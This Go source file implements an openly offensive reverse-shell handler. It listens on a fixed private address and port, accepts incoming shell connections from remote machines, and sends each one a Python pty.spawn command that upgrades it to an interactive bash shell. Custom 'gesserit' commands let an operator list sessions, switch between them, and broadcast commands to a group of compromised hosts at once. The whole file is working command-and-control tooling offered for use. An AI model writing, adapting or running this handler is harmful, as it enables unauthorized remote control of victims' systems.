package main

import (
	"fmt"
	"net"
	"os"
	"bufio"
	"strings"
	"strconv"
)

const (
	HOST = "192.168.172.1"
	PORT = "42069"
	TYPE = "tcp"
)

type session struct {
	connection net.Conn
	sid int
}

func receiveData(conn net.Conn) string {
	msg := make([]byte, 2048)
	_, err := conn.Read(msg[0:])
	if err != nil {
		fmt.Println("Error receiving data", err.Error())
	}
	return string(msg)
}

func sendData(conn net.Conn, data string) {
	_, err := conn.Write([]byte(data))
	if err != nil {
		fmt.Println("Error sending data", err.Error())
	}
}

func groupSendData(groupSessionList []session, data string) {
	for i:= 0; i < len(groupSessionList); i++ {
		sendData(groupSessionList[i].connection, data);
	}
}

func handleConnection(s session) {
	fmt.Println("attempting to spawn tty session...")
	tty_spawn := "python -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
	sendData(s.connection, tty_spawn)
	fmt.Println("------------------------------------------")
	for {
		fmt.Print(receiveData(s.connection))
	}
}

func listen(l net.Listener, sessions *[]session){
	fmt.Println("Listening")
	i := 0
	for {
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error trying to accept", err.Error())
			os.Exit(1)
		}
		s := session{conn, i}
		*sessions = append(*sessions, s)
		fmt.Println("New Session from " + conn.RemoteAddr().String())
		i++
		go handleConnection(s)
		defer conn.Close()
	}
}

func list_sessions(sessions []session, currentSession int){
	for i:= 0; i < len(sessions); i++ {
		if i == currentSession {
			fmt.Println("*", sessions[i].sid, ": " + sessions[i].connection.RemoteAddr().String())
		}else{
			fmt.Println(sessions[i].sid, ": " + sessions[i].connection.RemoteAddr().String())
		}
	}
}

func print_group(sessions []session){
	for i:= 0; i < len(sessions); i++ {
		fmt.Println(sessions[i].sid, ": " + sessions[i].connection.RemoteAddr().String())
	}
}

func main() {

	currentSession := 0
	sessions := make([]session, 0)
	groupSessionList := make([]session, 0)

	l, err := net.Listen(TYPE, HOST + ":" + PORT)
	if err != nil {
		fmt.Println("Error trying to listen", err.Error())
		os.Exit(1)
	}

	defer l.Close()

	go listen(l, &sessions)

	for {
		reader := bufio.NewReader(os.Stdin)
		cmd, _ := reader.ReadString('\n')
		if strings.Contains(cmd, "gesserit switch") {
			st := strings.Fields(cmd)
			newS, err := strconv.Atoi(st[2])
			if err != nil {
				fmt.Println("Session does not exist")
			}
			currentSession = newS
		} else if cmd == "gesserit list\n"{
			list_sessions(sessions, currentSession)
		} else if cmd == "gesserit grouplist\n" {
			print_group(groupSessionList)
		} else if strings.Contains(cmd, "gesserit add"){
			st := strings.Fields(cmd)
			s, err := strconv.Atoi(st[2])
			if err != nil {
				fmt.Println("Session does not exist")
			}
			groupSessionList = append(groupSessionList, sessions[s])
		} else if strings.Contains(cmd, "gesserit remove"){
			st := strings.Fields(cmd)
			s, err := strconv.Atoi(st[2])
			if err != nil {
				fmt.Println("Session does not exist")
			}
			for i:= 0; i < len(groupSessionList); i++ {
				if groupSessionList[i].sid == s{
					groupSessionList[i] = groupSessionList[len(groupSessionList) - 1]
					groupSessionList = groupSessionList[:len(groupSessionList) - 1]
				}
			}
		} else if strings.Contains(cmd, "gesserit groupsend"){
			newCmd := cmd[18:]
			groupSendData(groupSessionList, newCmd)
		} else if cmd == "gesserit quit\n" {
			os.Exit(3)
		} else {
			sendData(sessions[currentSession].connection, cmd)
		}
	}
}
